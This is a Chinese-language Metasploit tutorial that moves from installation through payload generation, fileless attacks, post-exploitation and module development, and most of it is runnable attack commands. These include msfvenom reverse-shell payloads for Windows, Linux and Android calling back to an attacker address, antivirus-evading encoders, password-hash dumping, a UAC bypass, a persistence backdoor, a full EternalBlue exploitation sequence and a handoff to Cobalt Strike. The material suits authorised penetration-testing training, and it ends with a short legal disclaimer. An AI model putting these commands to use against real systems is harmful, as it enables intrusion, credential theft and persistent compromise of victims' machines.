
#### **第一章：MSF简介与安装**
1. **Metasploit框架概述**  
   - **历史背景**：2003年由H.D. Moore发布，2010年成为Rapid7旗下开源项目，支持漏洞利用、渗透测试和后渗透攻击一体化。
   - **核心功能**：包含6大模块——Exploit（漏洞利用）、Payload（攻击载荷）、Auxiliary（辅助模块）、Encoder（编码器）、Post（后渗透）、NOP（空指令）。

2. **安装与配置**  
   - **一键安装**（Linux/macOS）：  
     ```bash
     curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall
     ```
   - **数据库配置**：  
     ```bash
     service postgresql start && msfdb init  # 初始化数据库
     ```
   - **更新命令**：`sudo msfupdate`。

---

#### **第二章：MSF基础命令与模块**
1. **常用指令**  
   - **模块管理**：  
     ```bash
     search type:exploit windows smb  # 按类型筛选模块
     use exploit/windows/smb/ms17_010_eternalblue  # 加载模块
     show options  # 查看参数
     ```
   - **会话管理**：  
     ```bash
     sessions -l  # 列出所有会话
     sessions -i 1  # 切换到会话1
     ```

2. **监听模块（Exploit/Multi/Handler）**  
   - **防检测策略**：使用编码器规避杀软（如`x86/shikata_ga_nai`）。
   - **持续监听配置**：  
     ```bash
     set ExitOnSession false  # 保持后台监听
     ```

---

#### **第三章：Payload生成与无文件攻击**
1. **msfvenom跨平台Payload生成**  
   - **Windows**：  
     ```bash
     msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.5 LPORT=4444 -f exe > shell.exe
     ```
   - **Linux**：  
     ```bash
     msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.5 -f elf > backdoor.elf
     ```
   - **Android**：  
     ```bash
     msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.5 -o virus.apk
     ```

2. **无文件攻击技术**  
   - **Powershell内存加载**：  
     ```bash
     msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.5 -f psh-reflection
     ```
   - **Web交付攻击**：  
     ```bash
     use exploit/multi/script/web_delivery
     set target Python  # 生成Python反向Shell代码
     ```

---

#### **第四章：后渗透攻击实战**
1. **信息收集与提权**  
   - **获取系统信息**：  
     ```bash
     sysinfo  # 系统基本信息
     run post/windows/gather/hashdump  # 提取密码哈希
     ```
   - **绕过UAC提权**：  
     ```bash
     use exploit/windows/local/bypassuac_eventvwr
     set SESSION 1  # 绑定当前会话
     ```

2. **横向移动与持久化**  
   - **进程迁移**：  
     ```bash
     migrate <PID>  # 迁移到稳定进程（如explorer.exe）
     ```
   - **持久后门**：  
     ```bash
     run persistence -X -i 60 -p 443 -r 192.168.1.5  # 每60秒重连
     ```

---

#### **第五章：经典漏洞利用案例**
1. **永恒之蓝（MS17-010）漏洞利用**  
   ```bash
   use exploit/windows/smb/ms17_010_eternalblue
   set RHOST 192.168.1.100  # 目标IP
   set PAYLOAD windows/x64/meterpreter/reverse_tcp
   exploit  # 执行攻击
   ```

2. **RDP漏洞（CVE-2019-0708）检测**  
   ```bash
   use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
   ```

---

#### **第六章：MSF模块开发与扩展**
1. **自定义EXP模块开发**  
   - **模块结构示例**（Ruby）：  
     ```ruby
     class MetasploitModule < Msf::Exploit::Remote
       def exploit
         connect
         sock.put(payload.encoded)  # 发送恶意载荷
         handler
       end
     end
     ```
   - **模块加载**：将.rb文件放入`/usr/share/metasploit-framework/modules/exploits/custom`。

2. **与Cobalt Strike联动**  
   - **MSF会话转CS**：  
     ```bash
     use exploit/windows/local/payload_inject
     set PAYLOAD windows/meterpreter/reverse_http
     set LHOST [CS_IP] && set LPORT [CS_PORT]
     ```

---

#### **附录：漏洞情报与资源**
1. **CVE监控方法**  
   - 订阅GitHub仓库`rapid7/metasploit-framework`获取最新漏洞模块。
   - 使用`search cve:2023-XXXX`快速定位新漏洞利用代码。

---

### **参考资料**
-  MSF安装与数据库配置
-  模块目录结构与辅助扫描
-  Payload生成与漏洞利用
-  后渗透提权与横向移动
-  Meterpreter高级操作
-  木马生成与监听实战
-  持久化与进程迁移
-  模块开发与CVE监控

本教程整合多篇权威指南，覆盖从基础到高级的完整渗透测试链路。实际使用时需遵守法律法规，建议在授权环境下验证技术细节。